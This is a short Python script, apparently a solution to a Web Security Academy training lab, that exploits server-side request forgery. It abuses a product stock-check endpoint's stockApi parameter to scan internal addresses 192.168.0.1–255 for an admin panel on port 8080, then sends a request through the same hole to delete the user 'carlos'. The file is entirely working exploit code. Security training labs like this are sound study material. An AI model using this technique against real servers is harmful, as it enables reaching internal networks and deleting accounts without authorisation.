#!/bin/env python3

import sys
import requests


url = "https://0a2a006803006e6c8228062000df000e.web-security-academy.net/product/stock"


for i in range(1,256):
    payload = {"stockApi" : f"http://192.168.0.{i}:8080/admin"}
    x = requests.post(url, payload)
    if x.ok:
        print(i)
        delete = {"stockApi" : f"http://192.168.0.{i}:8080/admin/delete?username=carlos"}
        y = requests.post(url, delete)
        sys.exit()
